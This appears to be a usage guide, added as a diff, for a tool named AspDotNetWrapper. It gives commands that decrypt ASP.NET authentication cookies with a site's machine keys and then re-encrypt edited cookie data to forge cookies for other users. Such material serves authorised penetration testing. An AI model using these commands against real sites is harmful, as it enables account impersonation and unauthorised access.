@@ -1,0 +1,39 @@
+To decrypt .aspnet.applicationcookie
+
+Command:
+
+AspDotNetWrapper.exe --keypath C:\Users\Root\Downloads\AspDotNetWrapper\AspDotNetWrapper\bin\Debug\MachineKeys.txt --cookie 195A989biBjM_NAqqiie5DnHKfcwrNGDuT-Suumqmw6oVyLSsjCFx9Emhf034TDjcuC9mfwNbi6yD-1QlbhcUAgdTOwY0o0sNbg7bJrNyUEf6ZoyYh2QAZHhmxteN_cMQJI7C1WOBEl0ocihUVhKghdxegwRURcYx2h1uMbijX3jsEf59L8Uco_PpfFLN--RtcLTKUvtZd0fH5Sgc1JQmsvTBr7IJ4Ua01I8uyEPYNXZGYvssSzJ8YN6MXioky3WBXv9NGNxDpgTpIPWGetgZ0iOSaTmqPr6sPu4ndesUV4SKsBroIP6Y38rr8LwFCZBKDK5dli4kKwmy9xeM02qshCoLf8ppeOiK2aMLfb9jqkraoss2BflD3hpDdrYHVGH7ryTWQh4HABYDC7OOMgdld3WJ1CUfJ9pmr0qnVFD4Gc --decrypt --purpose=owin.cookie  --valalgo=hmacsha512 --decalgo=aes
+
+Explanation of argument
+--cookie : value to decrypt using tool
+--decrypt : If you add this argumenet the tools try to decrypt the cookie
+--purpose: owin.cookie to decrypt the .aspnet.applicationcookie cookie
+--valalgo: Validation algorithm
+--decalgo: Decryption algorithm
+
+
+
+To decrypt .aspxauth cookie
+
+command:
+
+AspDotNetWrapper.exe --keypath C:\Users\Root\Downloads\AspDotNetWrapper\AspDotNetWrapper\bin\Debug\MachineKeys.txt --cookie CA387A93AD4214F356ED05C26C1E4D80F0804CD526766778B62D4F9213B87B5369755F95008A34644B9CA6B7646E191958A1AE14DB398AB943D3DB042EDA06EC4B5BEA9E3EB60E9877646AD4A50BE9435A2D3B4B3005836CBBBDA64A5E8738511211AA1F --decrypt --purpose=aspxauth --valalgo=sha1 --decalgo=aes
+
+Explanation of command:
+--cookie : value to decrypt using tool
+--decrypt : If you add this argumenet the tools try to decrypt the cookie
+--purpose: aspxauth to decrypt the .ASPXAUTH cookie
+--valalgo: Validation algorithm
+--decalgo: Decryption algorithm
+
+After perform decryption, The tool will store decryption information in "DecryptText.txt", In order to generate cookies for other users it is require to update the information "DecryptText.txt" file and then run the encryption utility of the tool as shown below:
+
+To encrypt the cookie
+
+command:
+
+AspDotNetWrapper.exe --decryptDataFilePath C:\Users\Root\Downloads\AspDotNetWrapper\AspDotNetWrapper\bin\Debug\DecryptedText.txt
+
+Explnation of command:
+
+decryptDataFilePath: Decrypted data path, which contain the plaintext information of user cookie
